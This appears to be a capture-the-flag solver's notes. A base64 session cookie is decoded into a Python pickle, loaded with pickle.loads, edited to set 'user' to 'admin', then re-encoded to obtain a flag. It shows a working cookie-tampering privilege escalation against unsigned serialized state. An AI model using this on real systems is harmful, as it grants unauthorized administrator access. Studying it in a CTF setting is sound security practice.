cookie: KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu
decode: 
(dp1
S'python'
p2
S'pickles'
p3
sS'subtle'
p4
S'hint'
p5
sS'user'
p6
Ns.

>>> import pickle
>>> s = pickle.loads(open('pickle').read())
>>> s
{'python': 'pickles', 'subtle': 'hint', 'user': None}
>>> s['user'] = 'admin'
>>> pickle.dumps(s)
"(dp0\nS'python'\np1\nS'pickles'\np2\nsS'subtle'\np3\nS'hint'\np4\nsS'user'\np5\nS'admin'\np6\ns."
>>> open('pickle2','w').write(pickle.dumps(s))
KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQK
c1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=

Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
